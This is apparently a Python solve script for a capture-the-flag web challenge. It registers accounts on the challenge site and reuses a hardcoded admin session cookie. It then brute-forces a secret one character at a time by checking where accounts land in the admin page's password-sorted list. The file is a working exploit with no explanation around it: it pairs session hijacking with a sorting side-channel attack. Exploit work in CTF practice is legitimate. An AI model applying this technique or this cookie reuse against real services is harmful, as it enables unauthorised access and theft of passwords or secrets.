import requests
import re
import time

BASE_URL = "https://web-crabspace-crabspace-4239703cca073459.be.ax"

def get_space_url(text):
  uid_post = re.findall(r'<a\s+href="/space/([^"]+)">', text)[0]
  return uid_post

def following(uuid, cookie):
  r = requests.post(BASE_URL+"/api/follow", headers={"Content-Type":"application/x-www-form-urlencoded", "Cookie":f"sid={cookie}"}, data=f"id={uuid}")
  assert r.status_code == 200

def register_acc_and_follow(username, password):
  r1 = requests.post(BASE_URL+"/api/register", headers={"Content-Type":"application/x-www-form-urlencoded"}, data=f"name={username}&pass={password}")
  uid_post = get_space_url(r1.text)
  k = r1.cookies["sid"]
  return uid_post, k


chars = "0123456789_abcdefghijklmnopqrstuvwxyz}"
# chars = "abc}"
main_account_us = "xon1l"
main_password = "1234567"

main_acc_post, main_cookie = register_acc_and_follow(main_account_us, main_password)
print(f"Main account: {main_account_us}:{main_password} \ncookie:{main_cookie}\npost: {main_acc_post}\n")


# # following admin
admin_uuid = "eae6ba36-9b04-4aed-8da4-6085694fee3a"
admin_cookie = "cWRWEoNC/+hi/TBZcmnIHP3E8ZzGCEJraa3oB2Yxasw=LAAAAAAAAAB6TmhEYlJJZUVHWXNpb2dQTVI5dHVsY2c3OEtORi90eXlTYmJUMURIN2pNPQEeAAAAAAAAADIwMjMtMDgtMDNUMjA6MDU6NTcuMzU1NDgxOTc3WgEAAAAAAAAAAgAAAAAAAABpZCYAAAAAAAAAImVhZTZiYTM2LTliMDQtNGFlZC04ZGE0LTYwODU2OTRmZWUzYSI="
following(admin_uuid, main_cookie)
print("Finnish step 1")

flag = "corctf{"

while True:
  for i in chars:
    if (i == '}'):
      print(flag + "}")
      print("Finnish")
      exit(0)


    payload = flag + i
    name = main_account_us + payload
    password = payload + "~"*8
    #register new accoun
    print(f"Trying: payload: {payload}")
    acc_post, cookie = register_acc_and_follow(name, password)
    following(acc_post, main_cookie)
    r = requests.get(BASE_URL+f"/admin/{main_acc_post}?sort=pass", headers={"Cookie":f"sid={admin_cookie}"})
    following(acc_post, main_cookie)
    
    l1 = r.text.find("<td>admin</td>")
    l2 = r.text.find(f"<td>{name}</td>")
    print(f"l1: {l1} l2: {l2}")
    # time.sleep(1)
    if (l2 > l1):
      flag += i
      print(flag)
      break
    
   
  